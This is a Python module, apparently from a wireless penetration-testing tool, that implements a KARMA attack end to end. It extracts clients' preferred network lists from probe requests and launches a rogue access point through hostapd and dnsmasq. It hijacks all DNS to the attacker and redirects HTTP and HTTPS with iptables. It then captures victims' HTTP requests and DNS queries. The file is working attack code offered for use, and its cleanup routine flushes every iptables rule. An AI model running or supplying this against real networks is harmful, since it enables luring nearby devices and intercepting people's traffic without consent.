#!/usr/bin/env python
# -*- coding: utf-8 -*-

from .dependency import Dependency
from ..util.process import Process
from ..config import Configuration
from ..util.color import Color

import os
import re
import subprocess
import json
from collections import defaultdict

class KarmaProbeParser(Dependency):
    """
    Tool for parsing probe requests from PCAP files to extract PNL (Preferred Network List)
    """
    dependency_required = False  # Uses tshark which is optional
    dependency_name = 'tshark'
    dependency_url = 'https://www.wireshark.org/docs/man-pages/tshark.html'
    
    def __init__(self, capfile=None):
        self.capfile = capfile
        self.client_probes = defaultdict(list)  # MAC -> list of SSIDs
        self.pnl_networks = set()  # All unique SSIDs found
        self.probe_stats = defaultdict(int)  # SSID -> count
        
    def parse_probe_requests(self, capfile=None):
        """Parse probe requests from PCAP file and extract PNL data"""
        if capfile:
            self.capfile = capfile
            
        if not self.capfile or not os.path.exists(self.capfile):
            Color.pl('{!} {R}Error: PCAP file not found: {O}%s{W}' % self.capfile)
            return False
        
        try:
            # Use tshark to extract probe request frames
            command = [
                'tshark',
                '-r', self.capfile,
                '-n',  # Don't resolve addresses
                '-Y', 'wlan.fc.type_subtype == 0x04',  # Probe request frames
                '-T', 'fields',
                '-e', 'wlan.sa',  # Source MAC
                '-e', 'wlan.ssid'  # SSID
            ]
            
            process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            stdout, stderr = process.communicate()
            
            if process.returncode != 0:
                Color.pl('{!} {R}Error parsing probe requests: {O}%s{W}' % stderr.strip())
                return False
            
            # Parse output
            for line in stdout.split('\n'):
                line = line.strip()
                if not line or '\t' not in line:
                    continue
                
                parts = line.split('\t')
                if len(parts) >= 2:
                    client_mac = parts[0].strip()
                    ssid = parts[1].strip()
                    
                    if client_mac and ssid and ssid != '':
                        self.client_probes[client_mac].append(ssid)
                        self.pnl_networks.add(ssid)
                        self.probe_stats[ssid] += 1
            
            Color.pl('{+} {G}Parsed {C}%d{W} probe requests from {C}%d{W} clients{W}' % 
                    (sum(self.probe_stats.values()), len(self.client_probes)))
            Color.pl('{+} {G}Found {C}%d{W} unique SSIDs in PNL{W}' % len(self.pnl_networks))
            
            return True
            
        except Exception as e:
            Color.pl('{!} {R}Error parsing probe requests: {O}%s{W}' % str(e))
            return False
    
    def get_top_ssids(self, limit=10):
        """Get most frequently probed SSIDs"""
        sorted_ssids = sorted(self.probe_stats.items(), key=lambda x: x[1], reverse=True)
        return sorted_ssids[:limit]
    
    def get_client_pnl(self, client_mac):
        """Get PNL for specific client"""
        return list(set(self.client_probes.get(client_mac, [])))
    
    def export_pnl_data(self, output_file):
        """Export PNL data to JSON file"""
        data = {
            'pnl_networks': list(self.pnl_networks),
            'client_probes': dict(self.client_probes),
            'probe_stats': dict(self.probe_stats),
            'summary': {
                'total_clients': len(self.client_probes),
                'total_ssids': len(self.pnl_networks),
                'total_probes': sum(self.probe_stats.values())
            }
        }
        
        try:
            with open(output_file, 'w') as f:
                json.dump(data, f, indent=2)
            Color.pl('{+} {G}PNL data exported to: {C}%s{W}' % output_file)
            return True
        except Exception as e:
            Color.pl('{!} {R}Error exporting PNL data: {O}%s{W}' % str(e))
            return False


class KarmaRogueAP(Dependency):
    """
    Tool for managing rogue access points in KARMA attacks
    """
    dependency_required = False  # Uses hostapd, dnsmasq which are optional
    dependency_name = 'hostapd'
    dependency_url = 'https://wireless.wiki.kernel.org/en/users/documentation/hostapd'
    
    def __init__(self, interface=None, ssid=None, channel=None):
        self.interface = interface or Configuration.interface
        self.ssid = ssid or "KARMA-AP"
        self.channel = channel or Configuration.target_channel or 6
        self.hostapd_process = None
        self.dnsmasq_process = None
        self.config_files = []
        
    def create_config(self, ssid=None):
        """Create hostapd configuration file"""
        if ssid:
            self.ssid = ssid
            
        if not self.interface:
            Color.pl('{!} {R}Error: No interface specified for hostapd config{W}')
            return None
            
        config_content = f"""interface={self.interface}
driver=nl80211
ssid={self.ssid}
hw_mode=g
channel={self.channel}
wmm_enabled=0
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
"""
        
        config_file = Configuration.temp('hostapd_karma_%s.conf' % self.ssid.replace(' ', '_'))
        try:
            with open(config_file, 'w') as f:
                f.write(config_content)
            
            self.config_files.append(config_file)
            Color.pl('{+} {G}Created hostapd config for SSID: {C}%s{W}' % self.ssid)
            return config_file
            
        except Exception as e:
            Color.pl('{!} {R}Error creating hostapd config: {O}%s{W}' % str(e))
            return None
    
    def create_dhcp_config(self):
        """Create dnsmasq configuration for DHCP and DNS"""
        if not self.interface:
            Color.pl('{!} {R}Error: No interface specified for dnsmasq config{W}')
            return None
            
        config_content = f"""interface={self.interface}
dhcp-range=10.0.0.10,10.0.0.250,12h
dhcp-option=3,10.0.0.1
dhcp-option=6,10.0.0.1
server=8.8.8.8
log-queries
log-dhcp
address=/#/10.0.0.1
"""
        
        config_file = Configuration.temp('dnsmasq_karma.conf')
        try:
            with open(config_file, 'w') as f:
                f.write(config_content)
            
            self.config_files.append(config_file)
            Color.pl('{+} {G}Created dnsmasq config{W}')
            return config_file
            
        except Exception as e:
            Color.pl('{!} {R}Error creating dnsmasq config: {O}%s{W}' % str(e))
            return None
    
    def setup_interface(self):
        """Setup network interface for rogue AP"""
        if not self.interface:
            Color.pl('{!} {R}Error: No interface specified for rogue AP{W}')
            return False
            
        try:
            # Bring interface up
            subprocess.run(['ifconfig', self.interface, '10.0.0.1/24', 'up'], 
                          check=True, capture_output=True)
            
            # Enable IP forwarding using dynamic proc path
            ip_forward_path = '/proc/sys/net/ipv4/ip_forward'
            with open(ip_forward_path, 'w') as f:
                f.write('1')
            
            # Setup iptables rules
            iptables_rules = [
                f'iptables -t nat -A PREROUTING -i {self.interface} -p tcp --dport 80 -j DNAT --to-destination 10.0.0.1:80',
                f'iptables -t nat -A PREROUTING -i {self.interface} -p tcp --dport 443 -j DNAT --to-destination 10.0.0.1:80',
                f'iptables -A FORWARD -i {self.interface} -j ACCEPT'
            ]
            
            for rule in iptables_rules:
                subprocess.run(rule, shell=True, capture_output=True)
            
            Color.pl('{+} {G}Interface {C}%s{W} configured for rogue AP{W}' % self.interface)
            return True
            
        except Exception as e:
            Color.pl('{!} {R}Error setting up interface: {O}%s{W}' % str(e))
            return False
    
    def start_rogue_ap(self, ssid=None):
        """Start the rogue access point"""
        if ssid:
            self.ssid = ssid
        
        try:
            # Create configurations
            hostapd_config = self.create_config()
            dhcp_config = self.create_dhcp_config()
            
            if not hostapd_config or not dhcp_config:
                return False
            
            # Setup interface
            if not self.setup_interface():
                return False
            
            # Start hostapd
            hostapd_cmd = ['hostapd', hostapd_config]
            self.hostapd_process = Process(hostapd_cmd, devnull=True)
            
            # Start dnsmasq
            dnsmasq_cmd = ['dnsmasq', '-C', dhcp_config]
            self.dnsmasq_process = Process(dnsmasq_cmd, devnull=True)
            
            # Give processes time to start
            import time
            time.sleep(3)
            
            Color.pl('{+} {G}Rogue AP "{C}%s{W}" started on interface {C}%s{W}' % (self.ssid, self.interface))
            return True
            
        except Exception as e:
            Color.pl('{!} {R}Error starting rogue AP: {O}%s{W}' % str(e))
            return False
    
    def stop_rogue_ap(self):
        """Stop the rogue access point"""
        try:
            # Stop processes
            if self.hostapd_process:
                self.hostapd_process.interrupt()
            if self.dnsmasq_process:
                self.dnsmasq_process.interrupt()
            
            # Clean up iptables rules
            subprocess.run(['iptables', '-F'], capture_output=True)
            subprocess.run(['iptables', '-t', 'nat', '-F'], capture_output=True)
            
            # Clean up config files
            for config_file in self.config_files:
                if os.path.exists(config_file):
                    os.remove(config_file)
            
            Color.pl('{+} {G}Rogue AP stopped and cleaned up{W}')
            return True
            
        except Exception as e:
            Color.pl('{!} {R}Error stopping rogue AP: {O}%s{W}' % str(e))
            return False
    
    def get_connected_clients(self):
        """Get list of connected clients"""
        if not self.interface:
            Color.pl('{!} {R}Error: No interface specified for getting connected clients{W}')
            return []
            
        try:
            result = subprocess.run(['iw', 'dev', self.interface, 'station', 'dump'], 
                                  capture_output=True, text=True)
            
            if result.returncode == 0:
                clients = []
                for line in result.stdout.split('\n'):
                    if 'Station' in line:
                        mac_match = re.search(r'([a-fA-F0-9]{2}:[a-fA-F0-9]{2}:[a-fA-F0-9]{2}:[a-fA-F0-9]{2}:[a-fA-F0-9]{2}:[a-fA-F0-9]{2})', line)
                        if mac_match:
                            clients.append(mac_match.group(1).lower())
                return clients
            
        except Exception as e:
            if Configuration.verbose > 1:
                Color.pl('{!} {R}Error getting connected clients: {O}%s{W}' % str(e))
        
        return []
    
    @staticmethod
    def check_dependencies():
        """Check if required tools are available"""
        required_tools = ['hostapd', 'dnsmasq', 'tshark']
        missing_tools = []
        
        for tool in required_tools:
            result = subprocess.run(['which', tool], capture_output=True)
            if result.returncode != 0:
                missing_tools.append(tool)
        
        if missing_tools:
            Color.pl('{!} {R}Missing required tools for KARMA: {O}%s{W}' % ', '.join(missing_tools))
            return False
        
        return True


class KarmaTrafficCapture(Dependency):
    """
    Tool for capturing and analyzing traffic from KARMA victims
    """
    dependency_required = False
    dependency_name = 'airodump-ng'
    dependency_url = 'https://www.aircrack-ng.org/install.html'
    
    def __init__(self, interface=None):
        self.interface = interface or Configuration.interface
        self.capture_process = None
        
    def start_capture(self, output_file, target_mac=None):
        """Start traffic capture"""
        if not self.interface:
            Color.pl('{!} {R}Error: No interface specified for traffic capture{W}')
            return False
            
        try:
            cmd = ['airodump-ng', self.interface, '-w', output_file]
            if target_mac:
                cmd.extend(['--bssid', target_mac])
            
            self.capture_process = Process(cmd, devnull=True)
            Color.pl('{+} {G}Started traffic capture: {C}%s{W}' % output_file)
            return True
            
        except Exception as e:
            Color.pl('{!} {R}Error starting traffic capture: {O}%s{W}' % str(e))
            return False
    
    def stop_capture(self):
        """Stop traffic capture"""
        if self.capture_process:
            self.capture_process.interrupt()
            Color.pl('{+} {G}Stopped traffic capture{W}')
    
    def analyze_captured_data(self, capfile):
        """Analyze captured traffic for sensitive information"""
        try:
            # Analyze HTTP traffic
            http_analysis = self.analyze_http_traffic(capfile)
            
            # Analyze DNS queries
            dns_analysis = self.analyze_dns_queries(capfile)
            
            return {
                'http': http_analysis,
                'dns': dns_analysis
            }
            
        except Exception as e:
            Color.pl('{!} {R}Error analyzing captured data: {O}%s{W}' % str(e))
            return None
    
    def analyze_http_traffic(self, capfile):
        """Analyze HTTP traffic from captured data"""
        try:
            command = [
                'tshark',
                '-r', capfile,
                '-Y', 'http.request.method',
                '-T', 'fields',
                '-e', 'http.host',
                '-e', 'http.request.uri',
                '-e', 'http.user_agent'
            ]
            
            result = subprocess.run(command, capture_output=True, text=True)
            if result.returncode == 0 and result.stdout.strip():
                return result.stdout.strip().split('\n')
            
        except Exception as e:
            if Configuration.verbose > 1:
                Color.pl('{!} {R}Error analyzing HTTP traffic: {O}%s{W}' % str(e))
        
        return []
    
    def analyze_dns_queries(self, capfile):
        """Analyze DNS queries from captured data"""
        try:
            command = [
                'tshark',
                '-r', capfile,
                '-Y', 'dns.flags.response == 0',
                '-T', 'fields',
                '-e', 'dns.qry.name'
            ]
            
            result = subprocess.run(command, capture_output=True, text=True)
            if result.returncode == 0 and result.stdout.strip():
                return result.stdout.strip().split('\n')
            
        except Exception as e:
            if Configuration.verbose > 1:
                Color.pl('{!} {R}Error analyzing DNS queries: {O}%s{W}' % str(e))
        
        return []
